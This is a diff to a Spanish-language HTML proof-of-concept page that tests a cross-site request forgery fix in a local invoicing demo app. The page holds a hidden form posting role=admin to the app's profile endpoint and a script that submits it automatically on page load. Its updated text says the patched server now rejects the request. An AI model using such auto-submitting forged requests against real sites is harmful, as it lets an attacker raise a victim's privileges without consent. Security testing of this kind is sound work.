@@ -3,17 +3,17 @@
 <head><meta charset="UTF-8"><title>Página maliciosa (PoC CSRF)</title></head>
 <body>
   <h1>¡Felicidades, ganaste un premio!</h1>
-  <p>Esta página simula un sitio externo controlado por un atacante.
-  Si una víctima con sesión activa en MiniFacturas (http://localhost:3000) la visita,
-  el formulario se autoenvía y cambia su rol a "admin" sin que la víctima se entere.</p>
+  <p>Esta página simula un sitio externo controlado por un atacante. Antes del parche,
+  visitarla con sesión activa en MiniFacturas bastaba para cambiar el perfil de la víctima.
+  Ahora el envío debe fallar con 403 "Token CSRF inválido", porque este formulario
+  <strong>no conoce</strong> el token anti-CSRF del usuario (vive en una cookie no accesible
+  entre dominios y además ya no se acepta "role" por la allowlist de campos).</p>
 
-  <!-- El formulario apunta al servidor VÍCTIMA, no a este dominio -->
   <form id="csrfForm" action="http://localhost:3000/api/profile-form" method="POST">
     <input type="hidden" name="role" value="admin">
   </form>
 
   <script>
-    // Se autoenvía apenas carga la página, sin interacción del usuario
     document.getElementById('csrfForm').submit();
   </script>
 </body>
